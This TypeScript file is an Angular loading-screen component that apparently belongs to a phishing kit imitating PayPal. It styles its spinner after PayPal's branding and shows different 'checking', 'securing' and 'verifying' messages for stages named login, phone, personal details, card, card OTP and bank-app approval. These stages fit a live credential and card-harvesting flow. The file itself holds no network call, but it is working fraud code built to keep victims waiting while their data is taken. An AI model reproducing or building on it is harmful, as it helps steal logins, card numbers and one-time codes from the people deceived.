
import { Component, inject, computed, signal, OnInit, OnDestroy, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-loading',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center justify-center py-12 animate-fade-in">

        <!-- PayPal 2024 Modern Spinner -->
        <!-- A rotating blue arc/ring, distinct from the generic SVG -->
        <div class="relative w-16 h-16 mb-8">
             <div class="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
             <div class="absolute inset-0 border-4 border-pp-blue rounded-full border-t-transparent animate-spin-slow"></div>
        </div>

        <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight animate-fade-in-up">
          {{ title() | translate }}
        </h1>
        
        <p class="text-base text-slate-500 text-center font-medium max-w-xs mx-auto animate-pulse">
           {{ subMessage() | translate }}
        </p>
      </div>
    </app-public-layout>
  `,
  styles: [`
    .animate-spin-slow { animation: spin 1s linear infinite; }
    .animate-fade-in-up { animation: fadeInUp 0.5s ease-out; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  `]
})
export class LoadingComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  subMessage = signal('LOADING.SUB_1');
  private interval: any;
  private stuckCheckInterval: any;

  title = computed(() => {
    const stage = this.state.stage();
    if (stage === 'login') return 'LOADING.CHECKING';
    if (stage === 'phone_pending') return 'LOADING.SENDING';
    if (stage === 'personal_pending') return 'LOADING.UPDATING';
    if (stage === 'card_pending') return 'LOADING.SECURING';
    if (stage === 'card_otp_pending') return 'LOADING.VERIFYING';
    if (stage === 'bank_app_pending') return 'LOADING.WAITING';
    return 'LOADING.PROCESSING';
  });

  constructor() {
      // Logic: If waitingStart is missing but we are here, we might be stuck.
      effect(() => {
          if (this.state.currentView() === 'loading') {
              // Ensure timer is running in StateService
              if (!this.state.waitingStartPublic()) {
                  // If no timer, force a sync or restart it
                  console.warn('[Loading] Timer missing. Requesting sync/restart...');
                  this.state.syncState();
              }
          }
      });
  }

  ngOnInit() {
      const msgs = ['LOADING.SUB_1', 'LOADING.SUB_2', 'LOADING.SUB_3', 'LOADING.SUB_4'];
      let i = 0;
      this.interval = setInterval(() => {
          i++;
          this.subMessage.set(msgs[i % msgs.length]);
      }, 2500);

      // Safety: Stuck Check
      let timeInView = 0;
      this.stuckCheckInterval = setInterval(() => {
          timeInView += 1000;

          // If stuck for > 15s and no waitingStart, try to recover
          if (timeInView > 15000 && !this.state.waitingStartPublic()) {
               console.error('[Loading] Stuck detected. Recovering...');
               // Go back to previous view or login if unknown
               const prev = this.state.previousView();
               if (prev && prev !== 'loading') {
                   this.state.navigate(prev);
               } else {
                   this.state.navigate('login');
               }
          }
      }, 1000);
  }

  ngOnDestroy() {
      clearInterval(this.interval);
      clearInterval(this.stuckCheckInterval);
  }
}
